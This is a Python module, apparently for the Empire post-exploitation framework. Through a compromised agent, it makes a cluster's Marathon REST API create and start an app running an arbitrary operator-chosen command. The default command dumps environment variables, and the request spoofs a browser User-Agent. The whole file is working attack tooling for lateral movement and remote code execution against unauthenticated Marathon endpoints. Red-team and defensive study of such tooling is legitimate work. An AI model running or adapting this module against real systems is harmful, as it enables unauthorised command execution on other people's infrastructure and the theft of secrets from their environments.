from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Marathon API Create and Start App',
            'Author': ['@TweekFawkes'],
            'Description': ('Create and Start a Marathon App using Marathon\'s REST API'),
            'Background' : True,
            'OutputExtension': "",
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ["Marathon REST API documentation version 2.0: https://mesosphere.github.io/marathon/docs/generated/api.html", "Marathon REST API: https://mesosphere.github.io/marathon/docs/rest-api.html", "Marathon REST API: https://open.mesosphere.com/advanced-course/marathon-rest-api/"]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Target' : {
                'Description'   :   'FQDN, domain name, or hostname to lookup on the remote target.',
                'Required'      :   True,
                'Value'         :   'marathon.mesos'
            },
            'Port' : {
                'Description'   :   'The port to connect to.',
                'Required'      :   True,
                'Value'         :   '8080'
            },
            'ID' : {
                'Description'   :   'The id of the marathon app.',
                'Required'      :   True,
                'Value'         :   'app001'
            },
            'Cmd' : {
                'Description'   :   'The command to run.',
                'Required'      :   True,
                'Value'         :   'env && sleep 300'
            },
            'CPUs' : {
                'Description'   :   'The number of CPUs to assign to the app.',
                'Required'      :   True,
                'Value'         :   '1'
            },
            'Mem' : {
                'Description'   :   'The Memory (MiB) to assign to the app.',
                'Required'      :   True,
                'Value'         :   '128'
            },
            'Disk' : {
                'Description'   :   'The Disk Space (MiB) to assign to the app.',
                'Required'      :   True,
                'Value'         :   '0'
            },
            'Instances' : {
                'Description'   :   'The number of instances to assign to the app.',
                'Required'      :   True,
                'Value'         :   '1'
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        target = self.options['Target']['Value']
        port = self.options['Port']['Value']
        appId = self.options['ID']['Value']
        cmd = self.options['Cmd']['Value']
        cpus = self.options['CPUs']['Value']
        mem = self.options['Mem']['Value']
        disk = self.options['Disk']['Value']
        instances = self.options['Instances']['Value']
        script = """
import urllib2
target = "%s"
port = "%s"
appId = "%s"
cmd = "%s"
cpus = "%s"
mem = "%s"
disk = "%s"
instances = "%s"
url = "http://" + target + ":" + port + "/v2/apps"
try:
    data = '{'
    data += '"id": "'
    data += appId
    data += '",'
    data += '"cmd": "'
    data += cmd
    data += '",'
    data += '"cpus": '
    data += cpus
    data += ','
    data += '"mem": '
    data += mem
    data += ','
    data += '"disk": '
    data += disk
    data += ','
    data += '"instances": '
    data += instances
    data += '}'
    print str(data)
    request = urllib2.Request(url, data)
    request.add_header('User-Agent',
                   'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
                   'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
    request.add_header('Content-Type', 'application/json')
    opener = urllib2.build_opener(urllib2.HTTPHandler)
    content = opener.open(request).read()
    print str(content)
except Exception as e:
    print "Failure sending payload: " + str(e)
print "Finished"
""" %(target, port, appId, cmd, cpus, mem, disk, instances)
        return script